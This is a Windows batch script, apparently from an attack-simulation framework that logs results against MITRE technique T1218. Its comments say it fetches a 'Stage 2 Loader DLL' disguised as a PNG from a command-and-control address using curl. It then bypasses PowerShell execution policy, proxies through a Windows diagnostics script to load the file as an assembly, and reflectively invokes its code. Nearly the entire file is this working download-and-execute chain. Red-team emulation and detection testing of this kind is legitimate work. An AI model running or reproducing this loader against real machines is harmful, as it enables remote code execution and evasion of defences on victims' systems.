@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aBcDeFgH=%APPDATA%\11988\f631ad96
SET xYz123Ab=59680f21.txt
SET mNoPqRsT=https://10.0.0.49/stage/2/icon.png?11988-7
SET qWeRtY=ITZEL-S2B
SET uIoPlKh=11988
SET zXcVbNm=7
SET fGhJkLz=%PUBLIC%\\macula-simulations.log
SET wErTyUi=https://10.0.0.49

REM Cache timestamp once at start
SET tsvar=!DATE!/!TIME!

REM Debug log header
echo [!tsvar!][DEBUG][!qWeRtY!][!uIoPlKh!]: script_start>> "!fGhJkLz!" 2>nul

REM Step 1: Heartbeat fetch – download Stage 2 Loader DLL from C2
echo [!tsvar!][DEBUG][!qWeRtY!][!uIoPlKh!]: heartbeat_start>> "!fGhJkLz!" 2>nul
curl -k -s -o "!aBcDeFgH!\!xYz123Ab!" "!mNoPqRsT!"
set heartbeat_err=%errorlevel%
echo [!tsvar!][DEBUG][!qWeRtY!][!uIoPlKh!]: heartbeat_complete>> "!fGhJkLz!" 2>nul

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!qWeRtY!][!uIoPlKh!]: chdir_start>> "!fGhJkLz!" 2>nul
cd /d "!aBcDeFgH!" >nul 2>&1
set chdir_err=%errorlevel%
echo [!tsvar!][DEBUG][!qWeRtY!][!uIoPlKh!]: chdir_result=!chdir_err!>> "!fGhJkLz!" 2>nul

REM Step 3: Invoke Stage 2 DLL via PowerShell (using CL_LoadAssembly.ps1)
REM NOTE: Inside the PowerShell -command string, use {PHR_*} literals – the deployment patcher will replace them before runtime.
echo [!tsvar!][DEBUG][!qWeRtY!][!uIoPlKh!]: powershell_start>> "!fGhJkLz!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\11988\f631ad96\59680f21.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set ps_err=%errorlevel%
echo [!tsvar!][DEBUG][!qWeRtY!][!uIoPlKh!]: powershell_end=!ps_err!>> "!fGhJkLz!" 2>nul

REM Step 4: Generate timestamp for TTP log line
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t

REM Step 5: Log TTP result
if !ps_err! equ 0 (
    echo [!timestamp!][TTP][!qWeRtY!][!uIoPlKh!]: T1218^|System Binary Proxy Execution=OK=[]>> "!fGhJkLz!" 2>&1
) else (
    echo [!timestamp!][TTP][!qWeRtY!][!uIoPlKh!]: T1218^|System Binary Proxy Execution=FAIL:exitcode=!ps_err!>> "!fGhJkLz!" 2>&1
)

REM Step 6: Exit
endlocal
exit /b !ps_err!